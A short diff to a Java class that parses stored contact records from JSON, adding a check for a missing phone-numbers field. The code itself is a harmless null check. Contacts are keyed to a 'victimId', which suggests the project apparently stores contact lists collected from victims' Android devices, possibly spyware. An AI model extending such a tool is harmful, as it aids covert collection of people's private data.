@@ -78,8 +78,12 @@ public class Contacts extends BaseTable<Contact> {
             final String androidContactId = joContact.getString(COLUMN_ANDROID_CONTACT_ID);
             final String name = joContact.getString(COLUMN_NAME);
 
-            final JSONArray jaPhoneNumbers = joContact.getJSONArray(KEY_PHONE_NUMBERS);
-            final List<Contact.PhoneNumber> phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
+            List<Contact.PhoneNumber> phoneNumbers = null;
+            if (joContact.has(KEY_PHONE_NUMBERS)) {
+                final JSONArray jaPhoneNumbers = joContact.getJSONArray(KEY_PHONE_NUMBERS);
+                phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
+            }
+
             contactList.add(new Contact(victimId, androidContactId, null, name, phoneNumbers));
 
         }
